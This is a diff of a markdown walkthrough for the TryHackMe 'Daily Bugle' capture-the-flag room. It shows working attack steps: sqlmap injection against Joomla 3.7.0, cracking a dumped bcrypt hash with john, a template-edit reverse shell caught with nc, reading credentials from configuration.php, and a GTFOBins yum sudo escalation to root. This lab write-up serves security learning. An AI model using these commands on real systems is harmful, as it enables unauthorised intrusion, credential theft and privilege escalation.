@@ -27,6 +27,7 @@ Room Link: [https://tryhackme.com/room/dailybugle](https://tryhackme.com/room/da
 - Running nmap gives some ports.
 
 ```bash
+
 nmap -A 10.10.250.153
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-05 11:33 IST
 Nmap scan report for 10.10.250.153
@@ -51,12 +52,14 @@ PORT     STATE SERVICE VERSION
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 38.97 seconds
 ```
+
 - Question `What is the Joomla version?` Answer `3.7.0`
 Got this details using OWASP joomscan by Mohammad Reza Espargham , Ali Razmjoo.
 Command used: `joomscan  -u http://10.10.250.153/`
 - Using SearchSploit by exploitDB gives us SQL injection exploits on this joomla CMS version.
 
 ```bash
+
 searchsploit joomla 3.7.0
 ---------------------------------------------- ---------------------------------
  Exploit Title                                |  Path
@@ -67,6 +70,7 @@ Joomla! Component Easydiscuss < 4.0.21 - Cros | php/webapps/43488.txt
 Shellcodes: No Results
 
 ```
+
 - After some reasearch on the exploit https://www.exploit-db.com/exploits/42033 and using some commands in SQLMap,
 At first we crafted a command to begin SQL injection `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E`
 - Then crafted a SQLMap command to get db names `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E --dbs` and got a database named `joomla`
@@ -76,24 +80,29 @@ At first we crafted a command to begin SQL injection `sqlmap -u "http://10.10.25
 It shows result like that,
 
 ```bash
+
 +-----+------------+----------+---------------------+--------------------------------------------------------------+
 | id  | name       | username | email               | password                                                     |
 +-----+------------+----------+---------------------+--------------------------------------------------------------+
 | 811 | Super User | jonah    | jonah@tryhackme.com | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |
 +-----+------------+----------+---------------------+--------------------------------------------------------------+
 ```
+
 - We used `hashid` to detect hash type and it could be `bcrypt`.
 
 ```bash
+
 hashid '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
 Analyzing '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
 [+] Blowfish(OpenBSD) 
 [+] Woltlab Burning Board 4.x 
 [+] bcrypt
 ```
+
 - Now we can use `john the ripper` to decrypt the hash, using `rockyou.txt` wordlist.
 
 ```bash
+
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
 Using default input encoding: UTF-8
 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
@@ -105,6 +114,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
+
 - Question `What is Jonah's cracked password?` Answer `spiderman123`
 - Now we can login using username `jonah` and password `spiderman123` on http://10.10.250.153/administrator/.
 - Now just goto `Extensions` > `Templates` > `Templates` and select `Beez3` and edit the `index.php` file to get reverse shell.
@@ -112,6 +122,7 @@ Session completed.
 - Opening http://10.10.250.153/templates/beez3/index.php will give shell.
 
 ```bash
+
 nc -nlvp 1234
 Listening on 0.0.0.0 1234
 Connection received on 10.10.250.153 56764
@@ -120,10 +131,12 @@ Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_6
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=48(apache) gid=48(apache) groups=48(apache)
 ```
+
 - We can see only user named `jjameson` with command `ls /home`.
 - After some digging we got some password `*************` inside `/var/www/html/configuration.php` using `cat /var/www/html/configuration.php`.
 - So used the password to login ssh as user `jjameson` and got the flag
 ```bash ssh jjameson@10.10.250.153
+
 The authenticity of host '10.10.250.153 (10.10.250.153)' can't be established.
 ED25519 key fingerprint is SHA256:Gvd5jH4bP7HwPyB+lGcqZ+NhGxa7MKX4wXeWBvcBbBY.
 This key is not known by any other names
@@ -134,10 +147,12 @@ Last login: Tue Mar  5 04:27:31 2024
 [jjameson@dailybugle ~]$ cat /home/jjameson/user.txt
 **************************
 ```
+
 - Question `What is the user flag?` Answer `**************************`
 - Using `sudo -l` command shows `/usr/bin/yum`.
 
 ```bash
+
 sudo -l
 Matching Defaults entries for jjameson on dailybugle:
     !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
@@ -151,10 +166,12 @@ Matching Defaults entries for jjameson on dailybugle:
 User jjameson may run the following commands on dailybugle:
     (ALL) NOPASSWD: /usr/bin/yum
 ```
+
 - Lets follow https://gtfobins.github.io/gtfobins/yum/ sudo exploit to get root.
 - Just copy pasting given commands in `b` will upgrade ssh to `root`
 
 ```bash
+
 TF=$(mktemp -d)
 cat >$TF/x<<EOF
 [main]
@@ -179,14 +196,17 @@ EOF
 
 sudo yum -c $TF/x --enableplugin=y
 ```
+
 - So typing `cat /root/root.txt` will give us root flag.
 
 ```bash
+
 sh-4.2# id
 uid=0(root) gid=0(root) groups=0(root)
 sh-4.2# cat /root/root.txt
 ******************************
 ```
+
 - Question `What is the root flag?` Answer `**************************`
 
 ## Credits
